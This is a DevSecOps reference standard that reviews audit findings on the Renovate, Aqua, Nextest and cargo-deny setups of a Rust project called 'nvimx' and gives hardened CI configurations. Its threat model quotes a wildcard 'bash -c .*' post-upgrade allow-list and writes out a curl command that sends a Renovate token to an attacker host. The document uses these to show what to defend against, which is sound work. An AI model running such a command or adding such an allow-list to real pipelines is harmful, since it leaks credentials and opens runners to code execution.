# Enterprise DevSecOps & Supply Chain Architecture Standard (v2026.10)
## Evaluation of Renovate, Aqua, Cargo-Deny, and Nextest Configurations

**Status:** Approved Reference Standard  
**Target Level:** Principal Systems Architect & Principal DevSecOps Engineer  
**Scope:** `nvimx` Distribution & Continuous Integration Ecosystem  

---

## 1. Executive Summary & Verdict

An architectural and security evaluation of the audit findings reveals that **the critique is technically accurate on several core security and schema aspects, but partially conflates "tool adoption" with "security level"**:

| Component | Critique Finding | Verdict & Industry Consensus (Oct 2026) |
| :--- | :--- | :--- |
| **Renovate RCE** | `RENOVATE_ALLOWED_POST_UPGRADE_COMMANDS: '["bash -c .*"]'` enables RCE. | **100% VALID (CRITICAL VULNERABILITY).** Allowing wildcard shell execution in self-hosted Renovate runners completely disables execution boundaries, exposing GitHub App tokens to exfiltration via malicious PR configurations. |
| **Renovate Pinning** | `renovate-version: "latest"` defeats action commit pinning. | **100% VALID.** The action wrapper tag pinning is bypassed at runtime when pulling mutable `latest` Docker tags. Strict SLSA L3 / OpenSSF compliance mandates immutable OCI digest pinning (`@sha256:...`). |
| **Aqua vs Native CI** | Claims Aqua is mandatory for Principal+ compliance. | **ARCHITECTURAL OVER-ENGINEERING.** While Aqua's schema requirements (`ref:`, `require_checksum: true`) and `AQUA_ENFORCE_*` policies are real, adopting Aqua to download a single binary (Neovim) adds third-party registry supply-chain dependencies. A hermetic 5-line `curl \| sha256sum --check --strict` provides identical cryptographic guarantees with a smaller attack surface. |
| **Nextest Retries** | Global `retries = 2` in CI masks concurrency bugs. | **100% VALID.** Retrying unit tests in CI is an anti-pattern. Headless Neovim child processes require dedicated `test-groups` concurrency pools and `leak-timeout` to prevent descriptor and pipe leaks. |
| **Cargo-Deny Schema** | `vulnerability = "deny"`, `notice = "warn"` removed in v0.16+. | **100% VALID.** `cargo-deny` 0.16.0 finalized breaking schema deprecations. Modern configurations must omit these keys and use `{ crate = "..." }` in `bans.deny`. |

---

## 2. Deep Threat Model & Architectural Analysis

### 2.1. Renovate Self-Hosted Runner Security Model
Self-hosted Renovate instances execute natively on runner infrastructure to compute lockfiles and package updates. By design, Renovate trusts the code within scanned repositories.

```
[Untrusted PR / Dependency Update]
               │
               ▼
   [renovate.json: postUpgradeTasks] ────(Allowed by "bash -c .*")───► [Host Runner Execution]
                                                                                │
                                                                   [Token Exfiltration / RCE]
                                                                                │
                                                                                ▼
                                                                  [GitHub App: Repo/Org Access]
```

1. **The RCE Vector:** If an administrator sets `allowedCommands` (or legacy `allowedPostUpgradeCommands`) to `["bash -c .*"]` or `[".*"]`, any repository contributor who can modify `renovate.json` can inject arbitrary bash payloads.
2. **Token Blast Radius:** In a GitHub Action runner, the execution environment has access to the authentication token (`GITHUB_TOKEN` or GitHub App Installation Token). A bash script can send this token to an external attacker endpoint (`curl https://attacker.com -d token=$RENOVATE_TOKEN`).
3. **Hardened Defense:**
   - Enforce `RENOVATE_ALLOWED_POST_UPGRADE_COMMANDS: "[]"` globally.
   - Use `actions/create-github-app-token` strictly scoped to the exact repository (`repositories: "${{ github.event.repository.name }}"`).
   - Pin the container image with its SHA-256 digest (`renovate-version: "39.88.0@sha256:..."`).
   - Set workflow permissions to `permissions: contents: none`.

---

### 2.2. Aqua (`aquaproj/aqua`) vs Deterministic Cryptographic POSIX
Aqua is a declarative CLI tool version manager written in Go that integrates Cosign signature verification and SLSA Provenance validation for tools that publish them.

#### When Aqua is Justified (Enterprise Multi-Tool Stacks):
- Repositories managing 10+ developer CLI tools (e.g., `terraform`, `tflint`, `kubectl`, `helm`, `trivy`, `golangci-lint`) across both macOS/Linux developer laptops and CI runners.
- When paired with `aqua-renovate-config` to automatically bump versions and update `aqua-checksums.json` without ad-hoc scripts.

#### When Aqua is an Anti-Pattern (Lean Single-Binary Projects):
- In a pure Rust CLI project like `nvimx`, where the **only** external tool in CI is `neovim --headless` for E2E tests:
  - Adopting Aqua introduces a dependency on `aquaproj/aqua`, `aqua-installer`, and the external `aquaproj/aqua-registry`.
  - A direct POSIX script validates the official GitHub release artifact against a hardcoded SHA-256 digest:
    ```bash
    curl -fsSL --retry 3 -o "$ARCHIVE" "https://github.com/neovim/neovim/releases/download/${NVIM_VERSION}/nvim-linux-x86_64.tar.gz"
    printf '%s  %s\n' "${NVIM_SHA256}" "${ARCHIVE}" | sha256sum --check --strict
    ```
  - This provides exact cryptographic immutability with zero third-party dependencies.

---

### 2.3. Test Concurrency & Subprocess Leak Control (Nextest)
When running tests that spawn real headless Neovim processes (`nvim --headless`):
1. **Unbounded Concurrency Contention:** Running with `test-threads = "num-cpus"` can launch dozens of Neovim instances simultaneously, exhausting OS file descriptors and competing for temporary socket paths.
2. **Descriptor Leaks:** If a Neovim subprocess crashes or spawns an asynchronous RPC server that fails to close standard I/O pipes, standard test runners hang indefinitely. Nextest's `leak-timeout` detects and terminates these processes cleanly.
3. **Flakiness vs Bugs:** Setting `retries = 2` on unit tests hides memory safety bugs, race conditions, and non-deterministic behavior. Retries must strictly be limited to network or isolated E2E tests with exponential backoff.

---

## 3. Canonical Enterprise Reference Configurations

### 3.1. Hardened Self-Hosted Renovate Workflow (`.github/workflows/renovate.yml`)

```yaml
name: "Enterprise Renovate Automation"

on:
  workflow_dispatch:
  schedule:
    - cron: "0 3 * * 1"

permissions:
  contents: "none"

concurrency:
  group: "renovate-${{ github.repository }}"
  cancel-in-progress: false

jobs:
  renovate:
    name: "Run Hardened Renovate"
    runs-on: "ubuntu-24.04"
    timeout-minutes: 25
    steps:
      - name: "Generate Scoped GitHub App Token"
        id: "app-token"
        uses: "actions/create-github-app-token@df432ceedc7162793a195dd1713ff69aefc7379e" # v2.0.2
        with:
          app-id: "${{ secrets.RENOVATE_APP_ID }}"
          private-key: "${{ secrets.RENOVATE_PRIVATE_KEY }}"
          owner: "${{ github.repository_owner }}"
          repositories: "${{ github.event.repository.name }}"

      - name: "Execute Renovate (Digest-Pinned, Zero Post-Upgrade Shell)"
        uses: "renovatebot/github-action@fdfbb5c11bc32c256037a5b3a4a9b6c00300d832" # v41.0.1
        with:
          token: "${{ steps.app-token.outputs.token }}"
          renovate-version: "39.88.0@sha256:6eb4c864e80f8fb5dc86a2f1fb1215f7c222ebbd001c78eb5f5f5f4e61587d92"
        env:
          RENOVATE_AUTODISCOVER: "false"
          RENOVATE_REPOSITORIES: "${{ github.repository }}"
          RENOVATE_PLATFORM: "github"
          RENOVATE_ONBOARDING: "false"
          RENOVATE_REQUIRE_CONFIG: "required"
          RENOVATE_ALLOWED_POST_UPGRADE_COMMANDS: "[]"
          LOG_LEVEL: "info"
```

---

### 3.2. Aqua Manifest (`aqua.yaml`) with Enforced Verification

```yaml
---
# yaml-language-server: $schema=https://raw.githubusercontent.com/aquaproj/aqua/main/json-schema/aqua-yaml.json
checksum:
  enabled: true
  require_checksum: true
  supported_envs:
    - linux/amd64
    - darwin/arm64

registries:
  - type: standard
    ref: v4.330.0

packages:
  - name: neovim/neovim@v0.10.4
```

#### Corresponding Renovate Configuration (`renovate.json5`):

```json5
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:best-practices",
    "github>aquaproj/aqua-renovate-config#2.7.0"
  ]
}
```

---

### 3.3. Enterprise Test Isolation Configuration (`.config/nextest.toml`)

```toml
[store]
dir = "target/nextest"

# Concurrency pool for resource-heavy Neovim headless processes
[test-groups.neovim-headless]
max-threads = 4

[profile.default]
retries = 0
slow-timeout = { period = "30s", terminate-after = 2 }
leak-timeout = "500ms"
fail-fast = true

[profile.ci]
# Unit tests must never retry to prevent masking race conditions
retries = 0
fail-fast = false
failure-output = "immediate-final"
success-output = "never"
status-level = "fail"
final-status-level = "flaky"
slow-timeout = { period = "30s", terminate-after = 2 }
leak-timeout = "200ms"

[profile.ci.junit]
path = "junit-report.xml"
report-name = "enterprise-ci-suite"
store-success-output = false
store-failure-output = true

# E2E test isolation: dedicated thread pool with strict file descriptor leak control
[[profile.ci.overrides]]
filter = "binary(e2e) | test(/^test_/) & binary(e2e)"
test-group = "neovim-headless"
retries = { backoff = "exponential", count = 1, delay = "1s", jitter = true }
slow-timeout = { period = "45s", terminate-after = 2 }
leak-timeout = "1s"
```

---

### 3.4. Enterprise Dependency Governance Configuration (`deny.toml`)

```toml
[graph]
targets = [
    { triple = "x86_64-unknown-linux-gnu" },
    { triple = "x86_64-unknown-linux-musl" },
    { triple = "aarch64-unknown-linux-gnu" },
    { triple = "aarch64-unknown-linux-musl" },
    { triple = "aarch64-apple-darwin" },
    { triple = "x86_64-apple-darwin" },
]
all-features = true
no-default-features = false

[output]
feature-depth = 1

[advisories]
db-path = "~/.cargo/advisory-db"
db-urls = ["https://github.com/rustsec/advisory-db"]
unmaintained = "workspace"
unsound = "all"
yanked = "deny"
ignore = []

[licenses]
version = 2
confidence-threshold = 0.95
allow = [
    "MIT",
    "Apache-2.0",
    "Apache-2.0 WITH LLVM-exception",
    "BSD-2-Clause",
    "BSD-3-Clause",
    "ISC",
    "Unicode-DFS-2016",
    "Unicode-3.0",
    "Zlib",
]

[licenses.private]
ignore = true

[bans]
multiple-versions = "warn"
wildcards = "deny"
highlight = "all"
workspace-default-features = "allow"
external-default-features = "allow"
deny = [
    { crate = "openssl", reason = "Enforce rustls usage" },
    { crate = "openssl-sys", reason = "Enforce rustls usage" },
]

[sources]
unknown-registry = "deny"
unknown-git = "deny"
allow-registry = ["https://github.com/rust-lang/crates.io-index"]
allow-git = []

[sources.allow-org]
github = []
```
